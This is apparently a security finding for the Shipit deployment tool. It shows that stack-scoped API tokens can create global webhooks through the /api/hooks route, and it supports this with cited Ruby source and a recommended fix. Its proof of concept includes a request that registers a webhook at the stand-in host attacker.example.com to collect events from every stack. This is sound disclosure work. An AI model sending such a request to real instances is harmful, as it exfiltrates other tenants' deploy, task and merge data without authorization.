## Title
Stack-Scoped API Token Can Create a Global Webhook to Exfiltrate Task/Deploy Data for Every Stack - (File: `app/controllers/shipit/api/hooks_controller.rb`)

### Summary
`Shipit::ApiClient` records can be scoped to a single `Stack` via `stack_id`, and `BaseController#stacks` correctly restricts stack-level reads/writes to that stack when a `stack_id` is present. However, `Api::HooksController`, which is mounted at both the stack-nested route (`/api/stacks/*stack_id/hooks`) and the top-level global route (`/api/hooks`), never checks whether `current_api_client.stack_id` matches the requested scope. Any client holding the generic `write:hook` permission can call the top-level `/api/hooks` endpoint (where `params[:stack_id]` is absent) and create a **global** `Hook` (`stack_id: nil`), which by design receives events for every stack in the Shipit instance.

### Finding Description
`ApiClient` can be created with a `stack_id` to restrict the token to a single stack: `BaseController#stacks` uses this to filter `Stack.where(id: current_api_client.stack_id)` [1](#0-0) . This is the equality the token is meant to enforce: `token.stack_id == stack the token may touch`.

`Api::HooksController`, however, only enforces coarse-grained `read:hook` / `write:hook` permission checks and never consults `current_api_client.stack_id` [2](#0-1) . The scope of the hook created/modified is derived purely from the request path (`params[:stack_id]`), not from the authenticated client's authorization boundary: [3](#0-2) 

Both a stack-nested route and a global (non-scoped) route point to this same controller: [4](#0-3) 

Because `stack_id` in the controller is computed as `stack.id if params[:stack_id].present?`, hitting the global `/api/hooks` path (no `:stack_id` param) yields `stack_id == nil`, and `hooks.create(params)` creates a `Hook` with `stack_id: nil` — a **global** hook. `Hook.for_stack`/`Hook.deliver` explicitly deliver global hooks (`stack_id: nil`) for events belonging to *any* stack: `for_stack(stack_id) = where(stack_id: [nil, stack_id])` [5](#0-4) .

`ApiClient#check_permissions!` only checks the presence of the string `"write:hook"` in the `permissions` array; it has no notion of the client's own `stack_id` at all: [6](#0-5) .

Equality broken: **stack a token authorizes (`ApiClient#stack_id`) ≠ stack(s) the token's created hook actually touches (all stacks, via `Hook.for_stack` matching `stack_id: nil`)**.

### Impact Explanation
A hook, once registered, receives rich payloads for `deploy`, `rollback`, `task`, `merge`, `commit_status`, `lock`, etc. `Hook.emit`/`Hook.deliver!` POST this JSON to the attacker-controlled `delivery_url` [7](#0-6) [8](#0-7) . An attacker holding an `ApiClient` credential intentionally scoped to a single stack (e.g., a CI integration token meant only to read/deploy one repository/stack) can escalate to receive events — including deploy status, task output links, and commit/PR merge data — for **every other stack** managed by the Shipit instance, none of which the token was authorized to touch. This is an unauthorized cross-stack read of deploy/task state, matching the "High" impact bucket (unauthenticated/unauthorized read of stack state, task streams or deploy output across repositories the credential was never granted).

### Likelihood Explanation
Exploitation requires only a valid `ApiClient` token with `write:hook` permission — a common combination for integrations. No additional access (GitHub token, admin session, TLS interception) is needed; the attacker simply issues a `POST /api/hooks` instead of the (correct) `POST /api/stacks/:stack_id/hooks`, which is trivial and requires no special knowledge beyond reading the routes file. The permission model gives no indication that this bypasses stack scoping, making accidental or intentional exploitation likely for any multi-tenant Shipit deployment issuing stack-scoped tokens with hook permissions.

### Recommendation
In `Api::HooksController`, enforce that any hook created/updated/read by a stack-scoped `ApiClient` must be scoped to that client's own `stack_id`; reject (403/422) attempts to create or access global hooks (`stack_id: nil`) unless the authenticated client itself has no `stack_id` restriction (i.e., is a "global" client). Concretely, `hooks`/`stack_id` should intersect the path-derived scope with `current_api_client.stack_id` (mirroring the logic already used in `BaseController#stacks`), rather than trusting the path alone.

### Proof of Concept
1. Provision an `ApiClient` scoped to `Stack A` (`stack_id` set) with permissions `['write:hook']` — a typical "hook-only" integration credential for Stack A.
2. Using this token, call:
   ```
   POST /api/hooks
   Authorization: Basic base64(token)
   {"delivery_url": "https://attacker.example.com/collect", "events": ["deploy", "task", "merge"]}
   ```
   Because the route has no `:stack_id` segment, `HooksController#stack_id` returns `nil`, and `Hook.where(stack_id: nil).create(...)` succeeds — permitted purely by the generic `write:hook` check [9](#0-8) , with no comparison to the client's own `stack_id`.
3. From then on, every `deploy`, `rollback`, `task`, `merge`, `lock`, `commit_status` event for **all** stacks in the instance (not just Stack A) is POSTed to `https://attacker.example.com/collect`, per `Hook.for_stack(stack_id) = where(stack_id: [nil, stack_id])` [5](#0-4) .

### Citations

**File:** app/controllers/shipit/api/base_controller.rb (L74-80)
```ruby
      def stacks
        @stacks ||= current_api_client.stack_id? ? Stack.where(id: current_api_client.stack_id) : Stack.all
      end

      def stack
        @stack ||= stacks.from_param!(params[:stack_id])
      end
```

**File:** app/controllers/shipit/api/hooks_controller.rb (L1-24)
```ruby
# frozen_string_literal: true

module Shipit
  module Api
    class HooksController < BaseController
      require_permission :read, :hook, only: %i[index show]
      require_permission :write, :hook, only: %i[create update destroy]

      def index
        render_resources(hooks)
      end

      def show
        render(json: hook)
      end

      params do
        requires :delivery_url, String
        requires :events, Array[String]
        accepts :content_type, String
      end
      def create
        render_resource(hooks.create(params))
      end
```

**File:** app/controllers/shipit/api/hooks_controller.rb (L42-52)
```ruby
      def hook
        hooks.find(params[:id])
      end

      def hooks
        Hook.where(stack_id:)
      end

      def stack_id
        stack.id if params[:stack_id].present?
      end
```

**File:** config/routes.rb (L27-47)
```ruby
    scope '/stacks/*stack_id', stack_id: stack_id_format, as: :stack do
      get '/ccmenu' => 'ccmenu#show', as: :ccmenu
      resource :lock, only: %i[create update destroy]
      resources :tasks, only: %i[index show] do
        resource :output, only: :show
        member do
          put :abort
        end
      end
      resources :deploys, only: %i[index create] do
        resources :release_statuses, only: %i[create]
      end
      resources :rollbacks, only: %i[create]
      resources :commits, only: %i[index]
      resources :merge_requests, only: %i[index show update destroy]
      post '/task/:task_name' => 'tasks#trigger', as: :trigger_task
      resources :hooks, only: %i[index create show update destroy]
    end

    resources :hooks, only: %i[index create show update destroy]
  end
```

**File:** app/models/shipit/hook.rb (L93-119)
```ruby
    scope :global, -> { where(stack_id: nil) }
    scope :scoped_to, ->(stack) { where(stack_id: stack.id) }
    scope :for_stack, ->(stack_id) { where(stack_id: [nil, stack_id]) }

    class << self
      def emit(event, stack, payload)
        raise "#{event} is not declared in Shipit::Hook::EVENTS" unless EVENTS.include?(event.to_s)

        Shipit::EmitEventJob.perform_later(
          event: event.to_s,
          stack_id: stack&.id,
          payload: coerce_payload(payload)
        )
        deliver_internal_hooks(event, stack, payload)
      end

      def deliver_internal_hooks(event, stack, payload)
        Shipit.internal_hook_receivers.each do |receiver|
          receiver.deliver(event, stack, payload)
        end
      end

      def deliver(event, stack_id, payload)
        for_stack(stack_id).listening_event(event).each do |hook|
          hook.deliver!(event, payload)
        end
      end
```

**File:** app/models/shipit/hook.rb (L141-149)
```ruby
    def deliver!(event, payload)
      DeliverHookJob.perform_later(
        event: event.to_s,
        url: delivery_url,
        content_type: CONTENT_TYPES[content_type],
        payload: serialize_payload(payload),
        secret:
      )
    end
```

**File:** app/models/shipit/api_client.rb (L38-45)
```ruby
    def check_permissions!(operation, scope)
      required_permission = "#{operation}:#{scope}"
      unless permissions.include?(required_permission)
        raise InsufficientPermission, "This operation requires the `#{required_permission}` permission"
      end

      true
    end
```
